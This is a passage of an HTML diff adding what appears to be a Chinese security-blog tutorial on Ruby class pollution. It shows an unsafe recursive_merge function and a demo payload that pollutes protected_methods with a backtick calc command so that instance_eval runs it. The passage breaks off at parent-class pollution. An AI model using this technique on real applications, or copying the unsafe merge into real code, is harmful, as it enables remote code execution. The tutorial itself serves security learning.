@@ -1,0 +1,1185 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Ruby的类污染 参照这篇：浅析Ruby类污染及其在Sinatra框架下的利用-先知社区\nRuby类介绍 在Ruby中也是万物皆对象，下面定义一个Person类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 class Person @@cnt = 1 # 定义属性 attr_accessor :name, :age # 初始化方法 def initialize(name, age) @name = name @age = age end # 定义方法 def greet &#34;My name is #{@name} and I am #{@age} years old.&#34; end end person = Person.new(&#34;Alice&#34;, 30) puts person.greet 类变量（类似Java中类的静态变量）使用 @@前缀，实例变量使用@前缀，在类内部才用这种前缀来访问。\n">
+<title>Ruby的类污染</title>
+
+<link rel='canonical' href='https://0d000721999.github.io/p/ruby%E7%9A%84%E7%B1%BB%E6%B1%A1%E6%9F%93/'>
+
+<link rel="stylesheet" href="/scss/style.min.37a6022266b4205ec3a616ff86e34064f3524e0913faf185a3d362063a8d7490.css"><meta property='og:title' content="Ruby的类污染">
+<meta property='og:description' content="Ruby的类污染 参照这篇：浅析Ruby类污染及其在Sinatra框架下的利用-先知社区\nRuby类介绍 在Ruby中也是万物皆对象，下面定义一个Person类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 class Person @@cnt = 1 # 定义属性 attr_accessor :name, :age # 初始化方法 def initialize(name, age) @name = name @age = age end # 定义方法 def greet &#34;My name is #{@name} and I am #{@age} years old.&#34; end end person = Person.new(&#34;Alice&#34;, 30) puts person.greet 类变量（类似Java中类的静态变量）使用 @@前缀，实例变量使用@前缀，在类内部才用这种前缀来访问。\n">
+<meta property='og:url' content='https://0d000721999.github.io/p/ruby%E7%9A%84%E7%B1%BB%E6%B1%A1%E6%9F%93/'>
+<meta property='og:site_name' content='美咕噜的小站'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='类污染' /><meta property='article:published_time' content='2025-05-06T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-05-06T00:00:00&#43;00:00'/><meta property='og:image' content='https://0d000721999.github.io/p/ruby%E7%9A%84%E7%B1%BB%E6%B1%A1%E6%9F%93/1.png' />
+<meta name="twitter:title" content="Ruby的类污染">
+<meta name="twitter:description" content="Ruby的类污染 参照这篇：浅析Ruby类污染及其在Sinatra框架下的利用-先知社区\nRuby类介绍 在Ruby中也是万物皆对象，下面定义一个Person类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 class Person @@cnt = 1 # 定义属性 attr_accessor :name, :age # 初始化方法 def initialize(name, age) @name = name @age = age end # 定义方法 def greet &#34;My name is #{@name} and I am #{@age} years old.&#34; end end person = Person.new(&#34;Alice&#34;, 30) puts person.greet 类变量（类似Java中类的静态变量）使用 @@前缀，实例变量使用@前缀，在类内部才用这种前缀来访问。\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://0d000721999.github.io/p/ruby%E7%9A%84%E7%B1%BB%E6%B1%A1%E6%9F%93/1.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu988272603220494224.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">😋</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">美咕噜的小站</a></h1>
+            <h2 class="site-description">Ciallo～(∠・ω&lt; )⌒★</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://buuoj.cn/users/175721'
+                        target="_blank"
+                        title="BUUOJ"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-letter-b" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M7 20v-16h6a4 4 0 0 1 0 8a4 4 0 0 1 0 8h-6" />
+  <line x1="7" y1="12" x2="13" y2="12" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/0d000721999'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/friends/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                
+                <span>Friends</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#ruby类介绍">Ruby类介绍</a></li>
+    <li><a href="#不安全的递归合并">不安全的递归合并</a>
+      <ol>
+        <li><a href="#污染当前对象">污染当前对象</a></li>
+        <li><a href="#污染父类">污染父类</a></li>
+        <li><a href="#污染其他类">污染其他类</a></li>
+      </ol>
+    </li>
+    <li><a href="#类污染设置静态目录">类污染设置静态目录</a></li>
+    <li><a href="#类污染写erb模板">类污染写ERB模板</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/ruby%E7%9A%84%E7%B1%BB%E6%B1%A1%E6%9F%93/">
+                <img src="/p/ruby%E7%9A%84%E7%B1%BB%E6%B1%A1%E6%9F%93/1.png"
+                        
+                        width="1184" 
+                        height="1816" 
+                        loading="lazy"
+                        alt="Featured image of post Ruby的类污染" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ruby/" style="background-color: #264653; color: #fff;">
+                Ruby
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/ruby%E7%9A%84%E7%B1%BB%E6%B1%A1%E6%9F%93/">Ruby的类污染</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">May 06, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 5 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="ruby的类污染">Ruby的类污染
+</h1><p>参照这篇：<a class="link" href="https://xz.aliyun.com/news/16229?time__1311=eqUxnQitDtG%3DZRDBqDwj7DumxRnDcnmQi%3D%3DYD&amp;u_atoken=05973ec60774398b65f22325b9f0cb1e&amp;u_asig=1a0c399817433265577793073e004e"  target="_blank" rel="noopener"
+    >浅析Ruby类污染及其在Sinatra框架下的利用-先知社区</a></p>
+<h2 id="ruby类介绍">Ruby类介绍
+</h2><p>在Ruby中也是万物皆对象，下面定义一个Person类</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Person</span>
+</span></span><span class="line"><span class="cl">  <span class="vc">@@cnt</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1"># 定义属性</span>
+</span></span><span class="line"><span class="cl">  <span class="kp">attr_accessor</span> <span class="ss">:name</span><span class="p">,</span> <span class="ss">:age</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1"># 初始化方法</span>
+</span></span><span class="line"><span class="cl">  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="nb">name</span><span class="p">,</span> <span class="n">age</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="vi">@name</span> <span class="o">=</span> <span class="nb">name</span>
+</span></span><span class="line"><span class="cl">    <span class="vi">@age</span> <span class="o">=</span> <span class="n">age</span>
+</span></span><span class="line"><span class="cl">  <span class="k">end</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1"># 定义方法</span>
+</span></span><span class="line"><span class="cl">  <span class="k">def</span> <span class="nf">greet</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;My name is </span><span class="si">#{</span><span class="vi">@name</span><span class="si">}</span><span class="s2"> and I am </span><span class="si">#{</span><span class="vi">@age</span><span class="si">}</span><span class="s2"> years old.&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">end</span>
+</span></span><span class="line"><span class="cl"><span class="k">end</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">person</span> <span class="o">=</span> <span class="no">Person</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&#34;Alice&#34;</span><span class="p">,</span> <span class="mi">30</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="n">person</span><span class="o">.</span><span class="n">greet</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>类变量（类似Java中类的静态变量）使用 <code>@@</code>前缀，实例变量使用<code>@</code>前缀，在类内部才用这种前缀来访问。</p>
+<p>冒号前缀表示符号（Symbol）。Ruby中符号是轻量级的、不可变的字符串，通常用于表示标识符、方法名或键。符号的优点是它们在内存中只存储一次，因此在需要频繁比较或使用相同字符串的情况下，使用符号可以提高性能。</p>
+<p>Ruby对象的一些特殊的方法：</p>
+<ul>
+<li><code>attr_accessor</code>：定义实例变量的getter和setter方法，用于在类外部访问实例变量</li>
+<li><code>initialize</code>：类的构造方法</li>
+<li><code>to_s</code>：toString方法</li>
+<li><code>inspect</code>：和<code>to_s</code>差不多，常用于debug</li>
+<li><code>method_missing</code>：类似PHP的<code>__call__</code>方法，当调用一个不存在的方法时会触发</li>
+<li><code>respond_to?</code>：检测对象是否有某个方法或属性</li>
+<li><code>send</code>：根据方法名来调用（包括私有方法）</li>
+<li><code>public_send</code>：根据方法名调用公开方法</li>
+</ul>
+<p>Ruby对象的一些特殊的属性（类也算对象）</p>
+<ul>
+<li><code>class</code>：当前对象的类</li>
+<li><code>superclass</code>：父类</li>
+<li><code>subclasses</code>：子类数组</li>
+<li><code>instance_variables</code>：实例变量名的数组</li>
+<li><code>class_variables</code>：类变量名的数组</li>
+</ul>
+<p>在 Ruby 中，所有类的顶层父类是 <code>BasicObject</code>。<code>BasicObject</code> 是 Ruby 类层次结构中的根类，所有其他类都直接或间接地继承自它。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">MyClass</span>
+</span></span><span class="line"><span class="cl"><span class="k">end</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="no">MyClass</span><span class="o">.</span><span class="n">superclass</span>          <span class="c1"># Output: Object</span>
+</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="no">Object</span><span class="o">.</span><span class="n">superclass</span>           <span class="c1"># Output: BasicObject</span>
+</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="no">BasicObject</span><span class="o">.</span><span class="n">superclass</span>      <span class="c1"># Output: nil</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在实际污染中，用到的就是<code>class</code>、<code>superclass</code>、<code>subclasses</code>，先从当前对象找到当前类，回溯到父类Object，锁定要污染的变量所在的类，在从父类一层层找子类。</p>
+<h2 id="不安全的递归合并">不安全的递归合并
+</h2><p>Doyensec的文章中给出下面的merge函数，也介绍了两个实际案例，分别是<code>Ruby on Rails</code>的内置组件<code>ActiveSupport</code>提供的<code>deep_merge</code>，以及<code>Hashie</code>库提供的<code>deep_merge</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">recursive_merge</span><span class="p">(</span><span class="n">original</span><span class="p">,</span> <span class="n">additional</span><span class="p">,</span> <span class="n">current_obj</span> <span class="o">=</span> <span class="n">original</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">additional</span><span class="o">.</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="o">|</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">value</span><span class="o">.</span><span class="n">is_a?</span><span class="p">(</span><span class="no">Hash</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="n">current_obj</span><span class="o">.</span><span class="n">respond_to?</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">next_obj</span> <span class="o">=</span> <span class="n">current_obj</span><span class="o">.</span><span class="n">public_send</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">recursive_merge</span><span class="p">(</span><span class="n">original</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">next_obj</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="k">else</span>
+</span></span><span class="line"><span class="cl">        <span class="n">new_object</span> <span class="o">=</span> <span class="no">Object</span><span class="o">.</span><span class="n">new</span>
+</span></span><span class="line"><span class="cl">        <span class="n">current_obj</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="s2">&#34;@</span><span class="si">#{</span><span class="n">key</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">new_object</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">current_obj</span><span class="o">.</span><span class="n">singleton_class</span><span class="o">.</span><span class="n">attr_accessor</span> <span class="n">key</span>
+</span></span><span class="line"><span class="cl">      <span class="k">end</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">      <span class="n">current_obj</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="s2">&#34;@</span><span class="si">#{</span><span class="n">key</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="n">current_obj</span><span class="o">.</span><span class="n">singleton_class</span><span class="o">.</span><span class="n">attr_accessor</span> <span class="n">key</span>
+</span></span><span class="line"><span class="cl">    <span class="k">end</span>
+</span></span><span class="line"><span class="cl">  <span class="k">end</span>
+</span></span><span class="line"><span class="cl">  <span class="n">original</span>
+</span></span><span class="line"><span class="cl"><span class="k">end</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>recursive_merge</code>用于递归地合并两个对象<code>original</code>和<code>additional</code></p>
+<ol>
+<li>遍历<code>additional</code>对象中的每个键值对。</li>
+<li>处理嵌套的哈希：如果值是一个哈希，它会检查 <code>current_obj</code>（初始为 <code>original</code>）是否响应该键。如果响应，则递归合并嵌套的哈希。如果不响应，则创建一个新对象，将其设置为实例变量，并为其创建访问器。</li>
+<li>处理非哈希值：如果值不是哈希，则直接在 <code>current_obj</code> 上设置该值为实例变量，并为其创建访问器。</li>
+</ol>
+<h3 id="污染当前对象">污染当前对象
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kp">attr_accessor</span> <span class="ss">:x</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="vi">@x</span> <span class="o">=</span> <span class="n">x</span>
+</span></span><span class="line"><span class="cl">  <span class="k">end</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">def</span> <span class="nf">merge_with</span><span class="p">(</span><span class="n">additional</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">recursive_merge</span><span class="p">(</span><span class="nb">self</span><span class="p">,</span> <span class="n">additional</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">end</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">def</span> <span class="nf">check</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">protected_methods</span><span class="p">()</span><span class="o">.</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="nb">method</span><span class="o">|</span>
+</span></span><span class="line"><span class="cl">      <span class="nb">instance_eval</span><span class="p">(</span><span class="nb">method</span><span class="o">.</span><span class="n">to_s</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">end</span>
+</span></span><span class="line"><span class="cl">  <span class="k">end</span>
+</span></span><span class="line"><span class="cl"><span class="k">end</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>若能污染<code>protected_methods</code>，其返回值就能传入<code>instance_eval</code>进行代码执行。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">A</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">a</span><span class="o">.</span><span class="n">merge_with</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">               <span class="s2">&#34;protected_methods&#34;</span><span class="p">:</span> <span class="o">[</span><span class="s2">&#34;`calc`&#34;</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl">             <span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="n">a</span><span class="o">.</span><span class="n">check</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>当然这种污染的是当前的对象的属性，不影响父类以及其他实例对象。</p>
+<h3 id="污染父类">污染父类
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Base</span>
+</span></span><span class="line"><span class="cl">  <span class="vc">@@cmd</span> <span class="o">=</span> <span class="s2">&#34;puts 1&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">end</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Cmder</span> <span class="o">&lt;</span> <span class="no">Base</span>
